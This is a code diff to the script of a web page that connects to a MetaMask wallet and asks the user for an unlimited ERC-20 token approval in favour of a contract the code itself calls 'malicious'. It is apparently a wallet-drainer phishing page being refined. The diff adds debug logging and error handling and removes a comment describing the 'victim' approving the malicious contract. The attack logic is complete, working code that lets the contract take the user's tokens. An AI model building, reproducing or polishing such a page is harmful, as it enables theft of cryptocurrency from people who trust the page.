@@ -21,38 +21,45 @@
         let token;
 
         window.onload = () => {
+            console.debug("Page loaded. Checking for MetaMask...");
             if (typeof window.ethereum !== 'undefined') {
                 web3 = new Web3(window.ethereum);
-                loadABI();  // Load ABI dynamically
+                console.debug("MetaMask found. Initializing...");
+                loadABI();
                 init();
             } else {
                 alert("MetaMask not found!");
+                console.debug("MetaMask not found.");
             }
         };
 
         async function loadABI() {
-            // Request the ABI file for the malicious contract
-            const response = await fetch('abi.json');  // Ensure abi.json is in the same directory
-            const abi = await response.json();
-            // Initialize the malicious contract with its ABI
-            contract = new web3.eth.Contract(abi, contractAddress);
-            // ERC-20 token ABI (only the functions we need)
-            const erc20Abi = [
-                {
-                    "constant": false,
-                    "inputs": [
-                        { "name": "spender", "type": "address" },
-                        { "name": "amount", "type": "uint256" }
-                    ],
-                    "name": "approve",
-                    "outputs": [{ "name": "", "type": "bool" }],
-                    "payable": false,
-                    "stateMutability": "nonpayable",
-                    "type": "function"
-                }
-            ];
-            // Initialize the ERC-20 token contract with its ABI
-            token = new web3.eth.Contract(erc20Abi, tokenAddress);
+            try {
+                console.debug("Fetching ABI...");
+                const response = await fetch('abi.json');  // Ensure abi.json is in the same directory
+                const abi = await response.json();
+                contract = new web3.eth.Contract(abi, contractAddress);
+                console.debug("Malicious contract initialized:", contract);
+
+                const erc20Abi = [
+                    {
+                        "constant": false,
+                        "inputs": [
+                            { "name": "spender", "type": "address" },
+                            { "name": "amount", "type": "uint256" }
+                        ],
+                        "name": "approve",
+                        "outputs": [{ "name": "", "type": "bool" }],
+                        "payable": false,
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    }
+                ];
+                token = new web3.eth.Contract(erc20Abi, tokenAddress);
+                console.debug("ERC-20 token contract initialized:", token);
+            } catch (error) {
+                console.error("Error loading ABI:", error);
+            }
         }
 
         async function init() {
@@ -62,27 +69,31 @@
 
         async function connectWallet() {
             try {
+                console.debug("Requesting wallet connection...");
                 const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                 userAccount = accounts[0];
+                console.debug("Wallet connected:", userAccount);
                 document.getElementById('status').innerText = `Connected: ${userAccount}`;
                 document.getElementById('approveTokensBtn').style.display = "inline-block";
             } catch (error) {
-                console.error(error);
+                console.error("Error connecting wallet:", error);
             }
         }
 
         async function approveTokens() {
             try {
                 const unlimitedAmount = web3.utils.toHex('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
+                console.debug("Approving unlimited tokens for:", contractAddress);
                 
-                // Victim approves the malicious contract to spend unlimited tokens
                 await token.methods.approve(contractAddress, unlimitedAmount).send({ from: userAccount });
+                console.debug("Approval successful.");
                 document.getElementById('status').innerText = `Approval successful! Unlimited tokens have been approved.`;
             } catch (error) {
                 document.getElementById('status').innerText = "Approval failed!";
-                console.error(error);
+                console.error("Error during approval:", error);
             }
         }
     </script>
 </body>
 </html>
+
